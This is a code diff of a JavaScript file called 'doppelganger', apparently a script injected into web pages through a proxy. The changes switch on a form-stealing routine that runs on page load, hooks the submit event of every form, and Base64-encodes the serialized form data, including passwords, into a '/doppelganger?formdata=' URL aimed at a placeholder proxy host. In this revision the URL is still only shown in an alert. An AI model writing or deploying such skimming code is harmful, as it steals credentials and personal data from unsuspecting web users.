@@ -1,10 +1,12 @@
 var httpServer="http://proxyIpAddr:httpPort";
 
+
+
 function initialize_doppelganger()
 {
 	//display_calling_card();
-	//form_steal();
-	alert("Doppelganger running!");
+	form_steal();
+	//alert("Doppelganger running!");
 }
 
 function display_calling_card()
@@ -22,28 +24,27 @@ function display_calling_card()
 
 function steal_form_data(form)
 {
-	alert(Form.serialize(form));
+	encoded_form_data = Base64.encode(Form.serialize(form));
+	var url = "/doppelganger?formdata=" + encoded_form_data.substring(0, encoded_form_data.length - 2);
+	alert(url);
 }
 
 function form_steal()
 {
 	var forms = $$('form');
 	for (i=0; i<forms.length; i++)
-	{		
-		var formElements = Form.getElements(forms[i]);
+	{	
+		forms[i].observe('submit', function(event) { steal_form_data(this); });
+	
+		//var formElements = Form.getElements(forms[i]);
 		
-		for (j=0; j<formElements.length; j++)
-		{
-			if (formElements[j].type == "password")
-			{
-				if (forms[i].id === "")
-				{
-					forms[i].id = "form" + j;
-				}
-
-				Event.observe(forms[i].id, "submit", steal_form_data(forms[i]));
-			}
-		}
+		//for (j=0; j<formElements.length; j++)
+		//{
+		//	if (formElements[j].type == "submit")
+		//	{
+		//		formElements[j].observe('click', function () { alert("item clicked!"); });
+			//}
+		//}
 	}
 }
 
@@ -58,5 +59,6 @@ function break_fixit()
 {
 }
 
-Event.observe(window, "load", function() { initialize_doppelganger(); });
+//Event.observe(window, "load", function() { initialize_doppelganger(); });
+document.observe("dom:loaded", function() { initialize_doppelganger(); });
 
